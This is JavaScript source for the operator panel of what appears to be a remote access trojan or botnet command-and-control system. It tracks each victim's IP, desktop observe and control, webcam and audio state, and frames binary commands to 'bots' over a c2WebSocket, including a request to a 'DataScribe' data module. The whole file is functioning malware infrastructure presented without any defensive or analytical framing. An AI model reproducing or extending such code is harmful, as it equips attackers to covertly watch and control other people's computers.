// js/modules/core/states.js
window.AppState = {
    clientId: new URLSearchParams(window.location.search).get('id'),
    info: { ip: '...', status: 'offline' },
    desktop: { observe: false, control: false },
    webcam: { active: false },
    audio: { input: false, output: false },

    reset() {
        Object.assign(this.desktop, { observe: false, control: false });
        this.webcam.active = false;
        Object.assign(this.audio, { input: false, output: false });
    }
};

window.initClientUI = () => {
    const el = document.getElementById('clientId');
    if (el) el.textContent = AppState.clientId || 'Unknown';
};

// js/modules/core/messenger.js
const enc = new TextEncoder(), dec = new TextDecoder();

window.sendToBot = (mod, pay) => {
    const ws = window.c2WebSocket;
    if (!ws || ws.readyState !== 1) return;

    const bId = enc.encode(AppState.clientId), bMod = enc.encode(mod);
    const bPay = (pay instanceof Uint8Array) ? pay : enc.encode(typeof pay === 'object' ? JSON.stringify(pay) : String(pay));

    const pkt = new Uint8Array(6 + bId.length + bMod.length + bPay.length);
    const v = new DataView(pkt.buffer);

    let off = 0;
    pkt[off++] = bId.length; pkt.set(bId, off); off += bId.length;
    pkt[off++] = bMod.length; pkt.set(bMod, off); off += bMod.length;
    v.setUint32(off, bPay.length, false); off += 4;
    pkt.set(bPay, off);
    ws.send(pkt.buffer);
};

window.parseBinaryMessage = (buf) => {
    try {
        const v = new DataView(buf); let off = 0;
        const read = (len) => { const d = buf.slice(off, off + len); off += len; return d; };

        const id = dec.decode(read(v.getUint8(off++)));
        const mod = dec.decode(read(v.getUint8(off++)));
        const payLen = v.getUint32(off, false); off += 4;
        return { id, mod, payload: new Uint8Array(read(payLen)) };
    } catch (e) { return null; }
};

window.requestBotData = () => sendToBot('DataScribe', 'get_metadata');